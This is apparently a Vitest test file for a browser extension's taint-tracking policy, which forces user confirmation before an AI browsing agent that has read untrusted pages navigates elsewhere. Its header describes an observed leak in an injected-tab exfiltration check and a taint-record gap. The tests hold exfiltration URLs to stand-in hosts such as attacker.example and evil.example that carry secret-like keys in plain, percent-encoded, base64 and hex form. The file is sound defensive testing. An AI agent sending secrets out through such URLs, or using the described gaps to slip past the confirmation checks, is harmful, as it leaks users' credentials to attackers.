// @vitest-environment jsdom
/**
 * Proof tests for the model-free check leak of 2026-11-15 (inject_tab_exfil,
 * trusted-origin posture). They FAIL on main 63a169c.
 *
 * A: the leaking run was not a taint race. Its canary, recovered from the
 *    run's start timestamp (checkId model-free-2026-11-15T09-36-59-221Z), was
 *    sk-canary-5145780562385907: sixteen decimal digits. URL-risk scoring
 *    does not count a digit-only run as data, so a correctly tainted session
 *    got ordinary cards for the three URLs carrying it verbatim.
 * B: a separate gap found while reading the taint path: a taint record with
 *    unknown sources (host lineage, lost extension record) is turned into a
 *    single-origin record by the next navigation, even a denied one, and that
 *    origin then becomes the exempt destination.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { PolicyRuntime } from '../src/background/policy-runtime.ts'
import { taintForcedReasons, type TaintRecord } from '../src/security/taint.ts'

beforeEach(() => {
  vi.stubGlobal('chrome', {
    runtime: { id: 'ext', getURL: (path: string) => `chrome-extension://ext/${path}` },
    storage: {},
  } as unknown as typeof chrome)
})
afterEach(() => { vi.unstubAllGlobals() })

const SITE = 'http://127.0.0.1:43163'
const SINK = 'http://localhost:43163'
const tainted: TaintRecord = { sources: [SITE], lastReadOrigin: SITE, firstTool: 'browser_snapshot', since: 0 }

describe('A: URL-risk false negative under taint (the observed leak)', () => {
  const canary = 'sk-canary-5145780562385907'
  const urls = {
    'open_tab / navigate, as instructed': `${SINK}/sink/landing#token=${canary}`,
    'navigate, canary as a query value': `${SINK}/sink/q?d=${canary}`,
    'navigate, percent-encoded query value': `${SINK}/sink/q?d=${[...Buffer.from(canary)].map((byte) => `%${byte.toString(16).padStart(2, '0')}`).join('')}`,
  }
  for (const [label, url] of Object.entries(urls)) {
    it(`forces a card for the leaking run's canary: ${label}`, () => {
      // Diagnosis, not the property: analyzeUrl(url).risky is false for these three on main.
      for (const name of ['browser_navigate', 'browser_open_tab']) {
        expect(taintForcedReasons({ name, args: { url } }, tainted)).not.toEqual([])
      }
    })
  }
  it('still forces the encodings that were forced in that run (control)', () => {
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url: `${SINK}/sink/c/${Buffer.from(canary).toString('base64url')}` } }, tainted)).not.toEqual([])
    expect(taintForcedReasons({ name: 'browser_open_tab', args: { url: `${SINK}/sink/landing#${Buffer.from(canary).toString('hex')}` } }, tainted)).not.toEqual([])
  })
  it.each([
    'https://attacker.example/c?n=4111111111111111', // a card number
    'https://attacker.example/c?k=sk-canary-744646ca668266cc', // mixed hex, low measured entropy
    'https://attacker.example/c?k=sk-canary-9bdbdb9df9959fad',
  ])('forces a card for %s in a tainted session', (url) => {
    expect(taintForcedReasons({ name: 'browser_navigate', args: { url } }, { ...tainted, sources: ['https://bank.example'] })).not.toEqual([])
  })
})

describe('B: an unknown source set must stay unknown', () => {
  const runtime = (): PolicyRuntime => new PolicyRuntime({
    settings: () => ({ siteRules: [], siteDefaultsEnabled: true }),
    unrestricted: () => true,
    clearBridgeTaint: vi.fn(async () => {}),
  })
  const risky = 'https://attacker.example/c?k=sk-canary-800b3920a5708f56'
  const navigate = (policy: PolicyRuntime, id: string, url: string, ok: boolean) => {
    const call = { id, name: 'browser_navigate', args: { url }, sessionId: 'child' }
    const decision = policy.hook(id, 'child', true)(call, { reads: [], acts: [], destination: url })
    policy.recordResult(call, ok)
    return decision
  }

  it('keeps forcing after the user denied the first attempt (retry of a host-tainted session)', () => {
    const policy = runtime()
    // The Host says the session is tainted; this extension has no record of its own
    // (subagent or fork of a tainted session, another browser, a restarted browser).
    policy.markHostTaint('child')
    expect(navigate(policy, 'c1', risky, false).kind).toBe('force') // the user denies
    expect(navigate(policy, 'c2', risky, false).kind).toBe('force') // the agent simply retries
  })

  it('keeps forcing after a plain navigation to the attacker origin', () => {
    const policy = runtime()
    policy.markHostTaint('child')
    expect(navigate(policy, 'c1', 'https://attacker.example/', true).kind).not.toBe('force')
    expect(navigate(policy, 'c2', risky, true).kind).toBe('force')
  })
})

describe('C: a destination that was only attempted is not a page the conversation read', () => {
  const HELPDESK = 'http://helpdesk.example.test'
  const VERIFY = 'http://verify.example.test'
  const exfil = `${VERIFY}/verify?key=sk-demo-4f9a2c7e81b3d065`
  const saved: Array<{ sites: string[]; localOrigins: string[] }> = []
  const settings = { siteRules: [], siteDefaultsEnabled: true, taintExemptTrustedSites: true, taintExemptLocalPages: true, taintTrustedSites: [] as string[] }
  const runtime = (): PolicyRuntime => new PolicyRuntime({
    settings: () => settings,
    unrestricted: () => false,
    clearBridgeTaint: vi.fn(async () => {}),
    saveTaintTrust: async (change) => {
      saved.push(change)
      settings.taintTrustedSites = [...settings.taintTrustedSites, ...change.sites]
    },
  })
  beforeEach(() => {
    saved.length = 0
    settings.taintTrustedSites = []
  })
  let seq = 0
  const read = (policy: PolicyRuntime, origin: string): void => {
    const call = { id: `r${seq += 1}`, name: 'browser_snapshot', args: {}, sessionId: 's' }
    policy.hook(call.id, 's', false)(call, { reads: [origin], acts: [], pageOrigin: origin })
    policy.recordResult(call, true, origin)
  }
  const navigate = (policy: PolicyRuntime, url: string, ok: boolean, from?: string, name = 'browser_navigate') => {
    const call = { id: `n${seq += 1}`, name, args: { url }, sessionId: 's' }
    const decision = policy.hook(call.id, 's', false)(call, { reads: [], acts: [], destination: url })
    policy.recordResult(call, ok, from)
    return decision
  }
  const typeInto = (policy: PolicyRuntime, origin: string): string[] =>
    taintForcedReasons({ name: 'browser_type', args: { text: 'x' }, targetOrigin: origin }, policy.get('s'))

  it('the demo: a denied forced navigation leaves the destination out of the sources', () => {
    const policy = runtime()
    read(policy, HELPDESK)
    expect(navigate(policy, exfil, false, HELPDESK).kind).toBe('force') // the user denies
    expect(policy.get('s')).toMatchObject({ sources: [HELPDESK], attempted: [VERIFY], lastReadOrigin: HELPDESK })
    // The card of a retry does not say the session read the destination either.
    const retry = navigate(policy, exfil, false, HELPDESK)
    expect(retry.kind).toBe('force')
    expect(retry.kind === 'force' ? retry.reasons.join(' ') : '').toContain(`read untrusted page content from ${HELPDESK},`)
    expect(policy.get('s')).toMatchObject({ sources: [HELPDESK], attempted: [VERIFY] })
  })

  it.each(['browser_navigate', 'browser_open_tab'])('%s: a failed attempt is recorded the same way as a denied one', (name) => {
    const policy = runtime()
    read(policy, HELPDESK)
    navigate(policy, `${VERIFY}/`, false, name === 'browser_open_tab' ? undefined : HELPDESK, name)
    expect(policy.get('s')).toMatchObject({ sources: [HELPDESK], attempted: [VERIFY] })
  })

  it('never offers Trust for an attempted destination, and refuses a request for one', async () => {
    const policy = runtime()
    read(policy, 'https://news.example')
    navigate(policy, 'https://evil.example/c?k=sk-canary-800b3920a5708f56', false, 'https://news.example')
    expect(policy.get('s')).toMatchObject({ sources: ['https://news.example'], attempted: ['https://evil.example'] })
    expect(policy.trustable()).toEqual({ s: { 'https://news.example': { kind: 'site', entry: 'news.example' } } })
    expect(await policy.trustSources('s', ['https://evil.example'])).toEqual({ trusted: [], cleared: false })
    expect(saved).toEqual([])
    // Trusting every page that was read does not lift the taint while an attempted destination is not exempt.
    expect(await policy.trustSources('s', ['https://news.example'])).toEqual({ trusted: ['https://news.example'], cleared: false })
    expect(policy.get('s')).toBeDefined()
  })

  it('an attempt alone never makes its destination the only source', () => {
    const policy = runtime()
    // Nothing was read; the first call is a navigation that fails with no known tab origin.
    navigate(policy, 'https://evil.example/', false)
    expect(policy.get('s')).toMatchObject({ sources: [], attempted: ['https://evil.example'] })
    expect(navigate(policy, 'https://evil.example/c?k=sk-canary-800b3920a5708f56', false).kind).toBe('force')
    expect(typeInto(policy, 'https://evil.example')).not.toEqual([])
  })

  it('an attempt never narrows protection: it still counts against "only source"', () => {
    const policy = runtime()
    read(policy, HELPDESK)
    expect(typeInto(policy, HELPDESK)).toEqual([]) // writing back to the only page read moves nothing off-site
    navigate(policy, `${VERIFY}/`, false, HELPDESK)
    // As before this change: after the attempt neither origin is the only source.
    expect(typeInto(policy, HELPDESK)).not.toEqual([])
    expect(typeInto(policy, VERIFY)).not.toEqual([])
    expect(navigate(policy, exfil, false, HELPDESK).kind).toBe('force')
    expect(navigate(policy, `${HELPDESK}/t?key=sk-demo-4f9a2c7e81b3d065`, false, HELPDESK).kind).toBe('force')
  })

  it('a destination that is later really read becomes a source and stops being "attempted"', () => {
    const policy = runtime()
    read(policy, HELPDESK)
    navigate(policy, `${VERIFY}/`, false, HELPDESK)
    navigate(policy, `${VERIFY}/`, true, HELPDESK)
    const record = policy.get('s')
    expect(record?.sources).toEqual([HELPDESK, VERIFY])
    expect(record?.attempted).toBeUndefined()
    expect(record?.lastReadOrigin).toBe(VERIFY)
  })

  it('attempted destinations survive a worker restart', async () => {
    const stored: Record<string, unknown> = {}
    const storage = {
      get: async (key: string) => ({ [key]: stored[key] }),
      set: async (items: Record<string, unknown>) => { Object.assign(stored, items) },
    } as unknown as chrome.storage.StorageArea
    const make = (): PolicyRuntime => new PolicyRuntime({ settings: () => settings, unrestricted: () => false, clearBridgeTaint: vi.fn(async () => {}), storage })
    const first = make()
    await first.ready
    read(first, HELPDESK)
    navigate(first, `${VERIFY}/`, false, HELPDESK)
    await new Promise((resolve) => { setTimeout(resolve, 0) })
    const second = make()
    await second.ready
    expect(second.get('s')).toMatchObject({ sources: [HELPDESK], attempted: [VERIFY] })
  })
})
